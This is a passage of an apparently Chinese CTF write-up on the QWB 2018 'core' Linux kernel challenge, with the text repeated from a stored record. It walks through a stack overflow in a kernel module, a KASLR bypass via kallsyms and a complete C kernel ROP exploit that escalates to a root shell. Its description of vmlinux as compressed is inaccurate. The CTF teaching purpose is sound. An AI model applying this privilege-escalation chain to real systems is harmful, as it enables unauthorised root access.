vmlinuz是被压缩的linux内核，是可以被引导的\n- vmlinuz是一个统称。有两种详细的表现形式：zImage和bzImage(big zImage)。\n- zImage是vmlinuz经过gzip压缩后的文件，适用于小内核\n- bzImage是vmlinuz经过gzip压缩后的文件，适用于大内核\n\n简单的说，**vmlinux就是一个被压缩的`kernel`，是一个静态的ELF文件**。我们可以在vmlinux的`.text`段中查看到这个kernel的**所有函数地址(其基地址为vmlinux的基地址)**，而这些地址都是**静态的**。\n\n> **无论是找gadget还是找函数地址一定要在对应的vmlinux中找，本地的在kernel用的`.cpio`中的vmlinux中，远程的在给的vmlinux（可以看作libc）**\n\n因此，我们可以通过readelf查找`.text`段的基地址。\n\n```sh\nreadelf -t vmlinux\n```\n\n可以通过pwntools的ELF模块找到其中的地址，从而算出**函数到基地址的偏移**。\n\n```py\nfrom pwn import*\nelf=ELF('./vmlinux')\nvmbase=0xffffffff81000000\ncommit_offset=elf.symbols['commit_creds']-vmbase\nprepare_offset=elf.symbols['prepare_kernel_cred']-vmbase\n\nprint(\"commit_offset: \"+hex(commit_offset))\nprint(\"prepare_offset: \"+hex(prepare_offset))\n```\n\n但这还没有结束，我们需要获取运行中kernel的真实地址，才能计算出内核的基地址。\n\n在init中有下面的一段，将符号表复制到了`/tmp/kallsyms`中，通过读取符号表的内容，我们可以获取到`commit_creds`和`prepare_kernel_cred`的真实地址。\n\n```sh\n# 复制了一份符号表\ncat /proc/kallsyms > /tmp/kallsyms\n```\n\n符号表分为`地址、类型、函数名`三列，读取每一项后比对函数名就可以找到真实地址，这里用了`fscanf`函数。\n\n```c\nint fscanf(FILE *stream, const char *format, ...)\n//返回值为读取的个数\n//读取地址\nfscanf(symbols_table, \"%llx%s%s\", &addr, type, func_name);\n```\n\n读到真实地址后，用`真实地址-偏移`即可得到运行中kernel的基地址，借此我们可以计算出**两个基地址之间的偏移**。\n\n#### 获取gadget\n\n获取gadget同样需要利用vmlinux，可以直接使用`ROPgadget`来搜，不过这样分析一次vmlinux的时间挺长的，可以先把所有gadget搜出来，然后再用grep找。\n\n```sh\nROPgadget --binary vmlinux > gadget\ncat gadget | grep '...'\n```\n\n对于找不到的gadget，可以用pwntools\n\n```py\nfrom pwn import*\nelf=ELF(\"./vmlinux\")\ncontext.arch='amd64' # 记得设置arch，不然找不到\nprint(hex(elf.search(asm('iretq')).__next__()))\n```\n\n执行`commit_creds(prepare_kernel_cred(0))`的时候，因为返回值存在`rax`，因此我们需要`mov rdi, rax ;`之后再`commit_creds()`。\n\n这里找不到`mov rdi, rax ; ret`的gadget，因此用`mov rdi, rax; call rdx`来替代，所以要提前设置好`rdx`。除此之外，`call rdx`会将`rdx`**指向指令的下一条指令（地址上）入栈**，这会让rop链断开，因此`rdx`指向的指令需要把这个入栈的指令除掉，并通过`ret`接上rop链，这里用的是`pop rcx; ret`。\n\n#### 返回用户态\n\n为了让内核函数执行完成后能够顺利返回用户态，需要在用户态保存一些寄存器的值，这个函数应该首先被执行：\n\n```c\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid saveStatus()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");\n}\n```\n\n而在返回用户态时，只需要在栈中构造好保存的用户状态，执行`swapg; iretq`就能返回用户态。\n\n```c\n//最后的栈布局，用于返回用户态\n↓   swapgs\n    iretq\n    user_shell_addr // get shell函数的地址\n    user_cs\n    user_eflags //64bit user_rflags\n    user_sp\n    user_ss\n```\n\n#### qemu\n\n- 做题时最好首先file一下确认文件类型，如果不是cpio文件则在本地调试时应按照原先的打包方式打包回去，否则可能会出现无法启动等问题。有的题目会给出打包文件系统的shell文件，需要重点关注。\n\n- 如果题目给的内核跑不动，可以尝试将boot.sh中申请的内存改大些（即qemu的-m选项后面，如果64M跑不动就改成128M试试）。\n\n- 在入门测试时，经常会遇到内核启动不了，一直在重启的情况，将控制台强行叉掉后再开启可能会显示：`qemu-system-x86_64: -s: Failed to find an available port: Address already in use`。这是因为强制关闭后，qemu占用的端口还未被清除。解决方法：使用`lsof -i tcp:<port>`命令查看指定端口的占用情况，在start.sh中看到了qemu后的-s选项说明默认端口为1234。此时即输入`lsof -i tcp:1234`，找到占用的pid将其kill即可：`kill <pid>`\n\n#### gdb调试\n\n和用户态调试不同，kernel的调试需要我们attach到qemu开放的端口\n\n```sh\nsudo gdb\nfile vmlinux # 载入符号信息\ntarget remote localhost:1234 # -s 默认为1234端口\n\n```\n\n在本地调试的时候可以先用root调试，获取进程的基地址方便下断点\n\n```sh\n# qemu里获取基地址，通常基址的偏移相同，需要在gdb attach之前进行\ncat /sys/module/xxx/sections/.text\ncat /sys/module/xxx/sections/.data\ncat /sys/module/xxx/sections/.bss\n\n# 在gdb中设置基地址\nadd-symbol-file ./xxx.ko text_base -s .data data_base -s .bss bss_base \n```\n\n修改为root\n\n```sh\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n=> setsid /bin/cttyhack setuidgid 0 /bin/sh\n```\n\n### exp\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/types.h>\n\nvoid saveStatus();\nvoid get_address();\nvoid coreRead(char* buf);\nvoid coreCopyFunc(size_t length);\nvoid edit_off(size_t num);\nvoid shell();\nvoid print_binary(char* buf, int length);\n\n// gadget \n\nconst size_t pop_rdi_ret=0xffffffff81000b2f; \nconst size_t pop_rdx_ret=0xffffffff810a0f49; \nconst size_t pop_rcx_ret=0xffffffff81021e53; \nconst size_t swapgs_popfq_ret=0xffffffff81a012da; \nconst size_t iretq_ret=0xffffffff81050ac2; \nconst size_t mov_rdi_rax_call_rdx=0xffffffff8101aa6a; \n\nint fd=0;\nsize_t commit_creds=0, prepare_kernel_cred=0;\nsize_t raw_vmlinux_base=0xffffffff81000000;\nsize_t vmlinux_base=0;\nsize_t vmoffset=0;\n\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid saveStatus()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");\n}\n\n// get address from /tmp/kallsym\nvoid get_address()\n{\n    FILE* symbols_table=fopen(\"/tmp/kallsyms\",\"r\");\n    if(symbols_table==NULL)\n    {\n\t\tprintf(\"\\033[31m\\033[1m[x] Error: Cannot open file \\\"/tmp/kallsyms\\\"\\n\\033[0m\");\n\t\texit(1);\n    }\n     \n    size_t addr = 0;\n\tchar type[0x10];\n\tchar func_name[0x50];\n\t// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.\n\twhile(fscanf(symbols_table, \"%llx%s%s\", &addr, type, func_name))\n    {\n\t\tif(commit_creds && prepare_kernel_cred)\t\t// two addresses of key functions are all found, return directly.\n\t\t\treturn;\n        // function \"commit_creds\" found\n\t\tif(!strcmp(func_name, \"commit_creds\"))\n        {\t\t\n\t\t\tcommit_creds = addr;\n\t\t\tprintf(\"\\033[32m\\033[1m[+] Note: Address of function \\\"commit_creds\\\" found: \\033[0m%#llx\\n\", commit_creds);\n\t\t}\n        // function \"prepare_kernel_cred\" found\n        if(!strcmp(func_name, \"prepare_kernel_cred\"))\n        {\t\n\t\t\tprepare_kernel_cred = addr;\n\t\t\tprintf(\"\\033[32m\\033[1m[+] Note: Address of function \\\"prepare_kernel_cred\\\" found: \\033[0m%#llx\\n\", prepare_kernel_cred);\n\t\t}\n\t}\n}\n\nvoid coreRead(char* buf)\n{\n    ioctl(fd,0x6677889B,buf);\n}\n\nvoid coreCopyFunc(size_t length)\n{\n    ioctl(fd,0x6677889A,length);\n}\n\nvoid edit_off(size_t num)\n{\n    ioctl(fd,0x6677889C,num);\n}\n\nvoid shell()\n{\n    if(getuid())\n    {\n        printf(\"\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n\");\n        exit(-1);\n    }\n\n    printf(\"\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n\");\n    system(\"/bin/sh\");\n}\n\n// this is a universal function to print binary data from a char* array\nvoid print_binary(char* buf, int length){\n\tint index = 0;\n\tchar output_buffer[80];\n\tmemset(output_buffer, '\\0', 80);\n\tmemset(output_buffer, ' ', 0x10);\n\tfor(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){\n\t\tchar temp_buffer[0x10];\n\t\tmemset(temp_buffer, '\\0', 0x10);\n\t\tsprintf(temp_buffer, \"%#5x\", index);\n\t\tstrcpy(output_buffer, temp_buffer);\n\t\toutput_buffer[5] = ' ';\n\t\toutput_buffer[6] = '|';\n\t\toutput_buffer[7] = ' ';\n\t\tfor(int j=0; j<16; j++){\n\t\t\tif(index+j >= length)\n\t\t\t\tsprintf(output_buffer+8+3*j, \"   \");\n\t\t\telse{\n\t\t\t\tsprintf(output_buffer+8+3*j, \"%02x \", ((int)buf[index+j]) & 0xFF);\n\t\t\t\tif(!isprint(buf[index+j]))\n\t\t\t\t\toutput_buffer[58+j] = '.';\n\t\t\t\telse\n\t\t\t\t\toutput_buffer[58+j] = buf[index+j];\n\t\t\t}\n\t\t}\n\t\toutput_buffer[55] = ' ';\n\t\toutput_buffer[56] = '|';\n\t\toutput_buffer[57] = ' ';\n\t\tprintf(\"%s\\n\", output_buffer);\n\t\tmemset(output_buffer+58, '\\0', 16);\n\t\tindex += 16;\n\t}\n}\n\n\nint main()\n{\n    printf(\"\\033[34m\\033[1m[*] Start to exploit...\\033[0m\\n\");\n    saveStatus();\n\n    // open core\n    fd=open(\"/proc/core\",2);\n    if(fd==0)\n    {\n        printf(\"\\033[31m\\033[1m[x] Error: Cannot open process \\\"core\\\"\\n\\033[0m\");\n\t\texit(1);\n    }\n\n    \n    // get commit_creds and prepare_kernel_cred \n    get_address();\n    \n    char buf[0x50]={0};\n    // cal real vm base\n    vmlinux_base=commit_creds-0x9c8e0;\n    vmoffset=vmlinux_base-raw_vmlinux_base;\n    printf(\"\\033[34m\\033[1m[*] This is real vmlinux base :\\033[0m%llx\\n\",vmlinux_base);\n\n    // leak canary\n    edit_off(64);\n    coreRead(buf);\n    \n    size_t canary=((size_t*)buf)[0];\n    printf(\"\\033[35m\\033[1m[*] The value of canary is the first 8 bytes: \\033[0m%#llx\\n\", canary);\n\n    // make rop chain\n    size_t rop_chain[0x100];\n    int i=0;\n    // padding and canary\n    for(; i<10; i++)\n\t\trop_chain[i] = canary;\n    \n    // commit_creds(prepare_kernel_cred(0)); \n    // rdi=0\n    rop_chain[i++]=pop_rdi_ret+vmoffset;\n    rop_chain[i++]=0;\n    // prepare_kernel_cred(0);\n    rop_chain[i++]=prepare_kernel_cred;\n    // rdi=rax; call rdx --> pop rcx(move the next code of mov) --> commit_creds(prepare_kernel_cred(0));\n    rop_chain[i++]=pop_rdx_ret+vmoffset;\n    rop_chain[i++]=pop_rcx_ret+vmoffset;\n    rop_chain[i++]=mov_rdi_rax_call_rdx+vmoffset;\n    rop_chain[i++]=commit_creds;\n    // ret2usr swags; iretq\n    rop_chain[i++]=swapgs_popfq_ret+vmoffset;\n    rop_chain[i++]=0;   // popfq\n    rop_chain[i++]=iretq_ret+vmoffset;\n    // after the iretq: return address, user cs, user rflags, user sp, user ss\n    rop_chain[i++]=(size_t)shell;\n    rop_chain[i++]=user_cs;\n    rop_chain[i++]=user_rflags;\n    rop_chain[i++]=user_sp;\n    rop_chain[i++]=user_ss;\n\n\tprintf(\"\\033[34m\\033[1m[*] Our rop chain looks like: \\033[0m\\n\");\n\tprint_binary((char*)rop_chain, 0x100);\n\n\twrite(fd, (char*)rop_chain, 0x800);\n    // use negative number overflow\n\tcoreCopyFunc(0xffffffffffff0100);\n    return 0;\n\n}\n```\n\n\n\n\n\n","source":"_posts/QWB-core.md","raw":"---\ntitle: QWB_core\ndate: 2023-03-14 10:33:40\ntags:\n- pwn\n- kernel \n- ROP\n- ret2usr\ncategories:\n- pwn_wp\n\n---\n\n强网杯2018 core，从0到1的kernel。\n\n<!--more-->\n\n### 分析\n\n首先分析启动脚本`start.sh`\n\n```sh\nqemu-system-x86_64 \\\t# x86_64架构\n-m 64M \\\t# 分配64M内存\n-kernel ./bzImage \\\t\t# 使用bzImage作为内存镜像(kernel)\t\n-initrd  ./core.cpio \\\t# 使用core.cpio作为磁盘镜像(文件系统)\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\ # 设置root，指定终端为tty50，开启kaslr\n-s  \\\t# 启动后qemu不立即运行guest，而是等待主机gdb发起连接，使用1234端口\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\     # 网络配置\n-nographic  \\\t\t# 非图形化启动，使用命令行\n```\n\n解压``core.cpio`，查看`init`文件（初始化的过程）：\n\n```sh\n#!/bin/sh\n# 挂载文件系统\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t devtmpfs none /dev\n/sbin/mdev -s\nmkdir -p /dev/pts\nmount -vt devpts -o gid=4,mode=620 none /dev/pts\nchmod 666 /dev/ptmx\n# 复制了一份符号表\ncat /proc/kallsyms > /tmp/kallsyms\necho 1 > /proc/sys/kernel/kptr_restrict\necho 1 > /proc/sys/kernel/dmesg_restrict\n# 网络配置\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 10.0.2.15 netmask 255.255.255.0\nroute add default gw 10.0.2.2 \n# 加载了core.ko模块\ninsmod /core.ko\n\n#定时关机\npoweroff -d 120 -f &\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\necho 'sh end!\\n'\numount /proc\numount /sys\n\npoweroff -d 0  -f\n```\n\nchecksec一下`core.ko`:\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnTrain/StrongWeb2018core/core_give/give_to_player/core/core.ko'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n```\n\n扔到IDA逆一下，`init_module`是这个模块的初始化工作：\n\n```c\n__int64 init_module()\n{\n  core_proc = proc_create(\"core\", 0666LL, 0LL, &core_fops);\n  printk(&unk_2DE);\n  return 0LL;\n}\n```\n\n这个模块一开始就会创建一个自己的进程，使用的是`core_fops`。\n\n```c\nstatic inline struct proc_dir_entry *proc_create(const char *name, mode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);\n```\n\n- name就是要创建的文件名。\n- **mode是文件的访问权限，以UGO的模式表示。**\n    - UGO：使用三组字符串(或数字)表示属用户，属组和其他用户的rwx权限：r=4,w=2,x=1(因此777就是rwxrwxrwx)\n- **parent与proc_mkdir中的parent类似。也是父文件夹的proc_dir_entry对象**。\n- proc_fops就是该文件的操作函数了。\n\n```asm\n.data:0000000000000420 40 05 00 00 00 00 00 00       core_fops dq offset __this_module       ; DATA XREF: init_module↑o\n.data:0000000000000428 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000430 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000438 11 00 00 00 00 00 00 00       dq offset core_write\n.data:0000000000000440 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000448 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000450 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000458 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000460 00 00 00 00 00 00 00 00       dq 0\n.data:0000000000000468 5F 01 00 00 00 00 00 00       dq offset core_ioctl\n```\n\n`core_fops`中有`core_write`、`core_ioctl`和`core_release`三个函数。\n\n`core_release`仅输出一段字符串，没有利用价值。\n\n`core_write`会将一段用户空间的数据(最多0x800byte)，写入`bss`的`name`处。\n\n`core_ioctl`会根据请求码选择不同的操作，可以调用`core_read`将栈上偏移`off`的数据写入用户空间，可以设置`off`，也可以调用`core_copy_func`。\n\n在`core_copy_func`会将`bss`中的`name`复制到栈上，其中有一个**整数溢出**，可以通过**负数**绕过检查并实现栈溢出。\n\n补充一下相关的内容：`core_fops`是一个`file_operations`的结构体，通过覆盖其中的内容来修改用户层调用时，该内核模块中执行的函数。\n\n```c\nstruct file_operations {\n\tstruct module *owner;\n\tloff_t (*llseek) (struct file *, loff_t, int);\n\tssize_t (*read) (struct file *, char __user *, size_t, loff_t *);\n\tssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);\n\tssize_t (*read_iter) (struct kiocb *, struct iov_iter *);\n\tssize_t (*write_iter) (struct kiocb *, struct iov_iter *);\n\tint (*iopoll)(struct kiocb *kiocb, struct io_comp_batch *,\n\t\t\tunsigned int flags);\n\tint (*iterate) (struct file *, struct dir_context *);\n\tint (*iterate_shared) (struct file *, struct dir_context *);\n\t__poll_t (*poll) (struct file *, struct poll_table_struct *);\n\tlong (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);\n\tlong (*compat_ioctl) (struct file *, unsigned int, unsigned long);\n\tint (*mmap) (struct file *, struct vm_area_struct *);\n\tunsigned long mmap_supported_flags;\n\tint (*open) (struct inode *, struct file *);\n\tint (*flush) (struct file *, fl_owner_t id);\n\tint (*release) (struct inode *, struct file *);\n\tint (*fsync) (struct file *, loff_t, loff_t, int datasync);\n\tint (*fasync) (int, struct file *, int);\n\tint (*lock) (struct file *, int, struct file_lock *);\n\tssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);\n\tunsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);\n\tint (*check_flags)(int);\n\tint (*flock) (struct file *, int, struct file_lock *);\n\tssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);\n\tssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);\n\tint (*setlease)(struct file *, long, struct file_lock **, void **);\n\tlong (*fallocate)(struct file *file, int mode, loff_t offset,\n\t\t\t  loff_t len);\n\tvoid (*show_fdinfo)(struct seq_file *m, struct file *f);\n#ifndef CONFIG_MMU\n\tunsigned (*mmap_capabilities)(struct file *);\n#endif\n\tssize_t (*copy_file_range)(struct file *, loff_t, struct file *,\n\t\t\tloff_t, size_t, unsigned int);\n\tloff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,\n\t\t\t\t   struct file *file_out, loff_t pos_out,\n\t\t\t\t   loff_t len, unsigned int remap_flags);\n\tint (*fadvise)(struct file *, loff_t, loff_t, int);\n} __randomize_layout;\n```\n\n在`core_fops`中修改了内核中`write`的指向，在用户层调用`write`函数最终就会调用到这个内核模块中定义的`core_write`。\n\n经过上面的分析，我们可以有一个大概的思路：\n\n`查找关键函数地址计算偏移 --> 利用core_read泄露Canary--> 在name中构建ROP chain --> 利用core_copy_func的栈溢出执行ROP链 --> 获取root权限并返回用户态获取root shell`\n\n### 坑\n\n#### 对抗KASLR\n\n在`start.sh`中就可以看到，这道题开启了`KASLR`保护，这和`ASLR`是类似的，都是一种地址随机化技术，我们可以在获取地址后**计算偏移**来绕过。但对于没有相关经验的我来说，怎么计算偏移是一个问题，查阅资料后发现，这需要利用到vmlinux文件。\n\n在linux系统中，vmlinux（vmlinuz）是一个包含linux kernel的**静态链接的可执行文件**，文件类型可能是linux接受的可执行文件格式之一（ELF、COFF或a.out），vmlinux若要用于调试时则必须要在引导前增加symbol table\n\n**应用场景：**\n\n- 用于调试，但需要包含调试信息\n- 编译出来的内核原始文件，可以被用来制作后面zImage，bzImage等启动Image\n- UBoot不能直接使用vmlinux\n\n**相关内容：**\n\n- vmlinux是ELF文件。是编译出来的最原始的文件\n- vmlinuz是被压缩的linux内核，是可以被引导的\n- vmlinuz是一个统称。有两种详细的表现形式：zImage和bzImage(big zImage)。\n- zImage是vmlinuz经过gzip压缩后的文件，适用于小内核\n- bzImage是vmlinuz经过gzip压缩后的文件，适用于大内核\n\n简单的说，**vmlinux就是一个被压缩的`kernel`，是一个静态的ELF文件**。我们可以在vmlinux的`.text`段中查看到这个kernel的**所有函数地址(其基地址为vmlinux的基地址)**，而这些地址都是**静态的**。\n\n> **无论是找gadget还是找函数地址一定要在对应的vmlinux中找，本地的在kernel用的`.cpio`中的vmlinux中，远程的在给的vmlinux（可以看作libc）**\n\n因此，我们可以通过readelf查找`.text`段的基地址。\n\n```sh\nreadelf -t vmlinux\n```\n\n可以通过pwntools的ELF模块找到其中的地址，从而算出**函数到基地址的偏移**。\n\n```py\nfrom pwn import*\nelf=ELF('./vmlinux')\nvmbase=0xffffffff81000000\ncommit_offset=elf.symbols['commit_creds']-vmbase\nprepare_offset=elf.symbols['prepare_kernel_cred']-vmbase\n\nprint(\"commit_offset: \"+hex(commit_offset))\nprint(\"prepare_offset: \"+hex(prepare_offset))\n```\n\n但这还没有结束，我们需要获取运行中kernel的真实地址，才能计算出内核的基地址。\n\n在init中有下面的一段，将符号表复制到了`/tmp/kallsyms`中，通过读取符号表的内容，我们可以获取到`commit_creds`和`prepare_kernel_cred`的真实地址。\n\n```sh\n# 复制了一份符号表\ncat /proc/kallsyms > /tmp/kallsyms\n```\n\n符号表分为`地址、类型、函数名`三列，读取每一项后比对函数名就可以找到真实地址，这里用了`fscanf`函数。\n\n```c\nint fscanf(FILE *stream, const char *format, ...)\n//返回值为读取的个数\n//读取地址\nfscanf(symbols_table, \"%llx%s%s\", &addr, type, func_name);\n```\n\n读到真实地址后，用`真实地址-偏移`即可得到运行中kernel的基地址，借此我们可以计算出**两个基地址之间的偏移**。\n\n#### 获取gadget\n\n获取gadget同样需要利用vmlinux，可以直接使用`ROPgadget`来搜，不过这样分析一次vmlinux的时间挺长的，可以先把所有gadget搜出来，然后再用grep找。\n\n```sh\nROPgadget --binary vmlinux > gadget\ncat gadget | grep '...'\n```\n\n对于找不到的gadget，可以用pwntools\n\n```py\nfrom pwn import*\nelf=ELF(\"./vmlinux\")\ncontext.arch='amd64' # 记得设置arch，不然找不到\nprint(hex(elf.search(asm('iretq')).__next__()))\n```\n\n执行`commit_creds(prepare_kernel_cred(0))`的时候，因为返回值存在`rax`，因此我们需要`mov rdi, rax ;`之后再`commit_creds()`。\n\n这里找不到`mov rdi, rax ; ret`的gadget，因此用`mov rdi, rax; call rdx`来替代，所以要提前设置好`rdx`。除此之外，`call rdx`会将`rdx`**指向指令的下一条指令（地址上）入栈**，这会让rop链断开，因此`rdx`指向的指令需要把这个入栈的指令除掉，并通过`ret`接上rop链，这里用的是`pop rcx; ret`。\n\n#### 返回用户态\n\n为了让内核函数执行完成后能够顺利返回用户态，需要在用户态保存一些寄存器的值，这个函数应该首先被执行：\n\n```c\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid saveStatus()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");\n}\n```\n\n而在返回用户态时，只需要在栈中构造好保存的用户状态，执行`swapg; iretq`就能返回用户态。\n\n```c\n//最后的栈布局，用于返回用户态\n↓   swapgs\n    iretq\n    user_shell_addr // get shell函数的地址\n    user_cs\n    user_eflags //64bit user_rflags\n    user_sp\n    user_ss\n```\n\n#### qemu\n\n- 做题时最好首先file一下确认文件类型，如果不是cpio文件则在本地调试时应按照原先的打包方式打包回去，否则可能会出现无法启动等问题。有的题目会给出打包文件系统的shell文件，需要重点关注。\n\n- 如果题目给的内核跑不动，可以尝试将boot.sh中申请的内存改大些（即qemu的-m选项后面，如果64M跑不动就改成128M试试）。\n\n- 在入门测试时，经常会遇到内核启动不了，一直在重启的情况，将控制台强行叉掉后再开启可能会显示：`qemu-system-x86_64: -s: Failed to find an available port: Address already in use`。这是因为强制关闭后，qemu占用的端口还未被清除。解决方法：使用`lsof -i tcp:<port>`命令查看指定端口的占用情况，在start.sh中看到了qemu后的-s选项说明默认端口为1234。此时即输入`lsof -i tcp:1234`，找到占用的pid将其kill即可：`kill <pid>`\n\n#### gdb调试\n\n和用户态调试不同，kernel的调试需要我们attach到qemu开放的端口\n\n```sh\nsudo gdb\nfile vmlinux # 载入符号信息\ntarget remote localhost:1234 # -s 默认为1234端口\n\n```\n\n在本地调试的时候可以先用root调试，获取进程的基地址方便下断点\n\n```sh\n# qemu里获取基地址，通常基址的偏移相同，需要在gdb attach之前进行\ncat /sys/module/xxx/sections/.text\ncat /sys/module/xxx/sections/.data\ncat /sys/module/xxx/sections/.bss\n\n# 在gdb中设置基地址\nadd-symbol-file ./xxx.ko text_base -s .data data_base -s .bss bss_base \n```\n\n修改为root\n\n```sh\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n=> setsid /bin/cttyhack setuidgid 0 /bin/sh\n```\n\n### exp\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/types.h>\n\nvoid saveStatus();\nvoid get_address();\nvoid coreRead(char* buf);\nvoid coreCopyFunc(size_t length);\nvoid edit_off(size_t num);\nvoid shell();\nvoid print_binary(char* buf, int length);\n\n// gadget \n\nconst size_t pop_rdi_ret=0xffffffff81000b2f; \nconst size_t pop_rdx_ret=0xffffffff810a0f49; \nconst size_t pop_rcx_ret=0xffffffff81021e53; \nconst size_t swapgs_popfq_ret=0xffffffff81a012da; \nconst size_t iretq_ret=0xffffffff81050ac2; \nconst size_t mov_rdi_rax_call_rdx=0xffffffff8101aa6a; \n\nint fd=0;\nsize_t commit_creds=0, prepare_kernel_cred=0;\nsize_t raw_vmlinux_base=0xffffffff81000000;\nsize_t vmlinux_base=0;\nsize_t vmoffset=0;\n\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid saveStatus()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"\\033[34m\\033[1m[*] Status has been saved.\\033[0m\");\n}\n\n// get address from /tmp/kallsym\nvoid get_address()\n{\n    FILE* symbols_table=fopen(\"/tmp/kallsyms\",\"r\");\n    if(symbols_table==NULL)\n    {\n\t\tprintf(\"\\033[31m\\033[1m[x] Error: Cannot open file \\\"/tmp/kallsyms\\\"\\n\\033[0m\");\n\t\texit(1);\n    }\n     \n    size_t addr = 0;\n\tchar type[0x10];\n\tchar func_name[0x50];\n\t// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.\n\twhile(fscanf(symbols_table, \"%llx%s%s\", &addr, type, func_name))\n    {\n\t\tif(commit_creds && prepare_kernel_cred)\t\t// two addresses of key functions are all found, return directly.\n\t\t\treturn;\n        // function \"commit_creds\" found\n\t\tif(!strcmp(func_name, \"commit_creds\"))\n        {\t\t\n\t\t\tcommit_creds = addr;\n\t\t\tprintf(\"\\033[32m\\033[1m[+] Note: Address of function \\\"commit_creds\\\" found: \\033[0m%#llx\\n\", commit_creds);\n\t\t}\n        // function \"prepare_kernel_cred\" found\n        if(!strcmp(func_name, \"prepare_kernel_cred\"))\n        {\t\n\t\t\tprepare_kernel_cred = addr;\n\t\t\tprintf(\"\\033[32m\\033[1m[+] Note: Address of function \\\"prepare_kernel_cred\\\" found: \\033[0m%#llx\\n\", prepare_kernel_cred);\n\t\t}\n\t}\n}\n\nvoid coreRead(char* buf)\n{\n    ioctl(fd,0x6677889B,buf);\n}\n\nvoid coreCopyFunc(size_t length)\n{\n    ioctl(fd,0x6677889A,length);\n}\n\nvoid edit_off(size_t num)\n{\n    ioctl(fd,0x6677889C,num);\n}\n\nvoid shell()\n{\n    if(getuid())\n    {\n        printf(\"\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n\");\n        exit(-1);\n    }\n\n    printf(\"\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n\");\n    system(\"/bin/sh\");\n}\n\n// this is a universal function to print binary data from a char* array\nvoid print_binary(char* buf, int length){\n\tint index = 0;\n\tchar output_buffer[80];\n\tmemset(output_buffer, '\\0', 80);\n\tmemset(output_buffer, ' ', 0x10);\n\tfor(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){\n\t\tchar temp_buffer[0x10];\n\t\tmemset(temp_buffer, '\\0', 0x10);\n\t\tsprintf(temp_buffer, \"%#5x\", index);\n\t\tstrcpy(output_buffer, temp_buffer);\n\t\toutput_buffer[5] = ' ';\n\t\toutput_buffer[6] = '|';\n\t\toutput_buffer[7] = ' ';\n\t\tfor(int j=0; j<16; j++){\n\t\t\tif(index+j >= length)\n\t\t\t\tsprintf(output_buffer+8+3*j, \"   \");\n\t\t\telse{\n\t\t\t\tsprintf(output_buffer+8+3*j, \"%02x \", ((int)buf[index+j]) & 0xFF);\n\t\t\t\tif(!isprint(buf[index+j]))\n\t\t\t\t\toutput_buffer[58+j] = '.';\n\t\t\t\telse\n\t\t\t\t\toutput_buffer[58+j] = buf[index+j];\n\t\t\t}\n\t\t}\n\t\toutput_buffer[55] = ' ';\n\t\toutput_buffer[56] = '|';\n\t\toutput_buffer[57] = ' ';\n\t\tprintf(\"%s\\n\", output_buffer);\n\t\tmemset(output_buffer+58, '\\0', 16);\n\t\tindex += 16;\n\t}\n}\n\n\nint main()\n{\n    printf(\"\\033[34m\\033[1m[*] Start to exploit...\\033[0m\\n\");\n    saveStatus();\n\n    // open core\n    fd=open(\"/proc/core\",2);\n    if(fd==0)\n    {\n        printf(\"\\033[31m\\033[1m[x] Error: Cannot open process \\\"core\\\"\\n\\033[0m\");\n\t\texit(1);\n    }\n\n    \n    // get commit_creds and prepare_kernel_cred \n    get_address();\n    \n    char buf[0x50]={0};\n    // cal real vm base\n    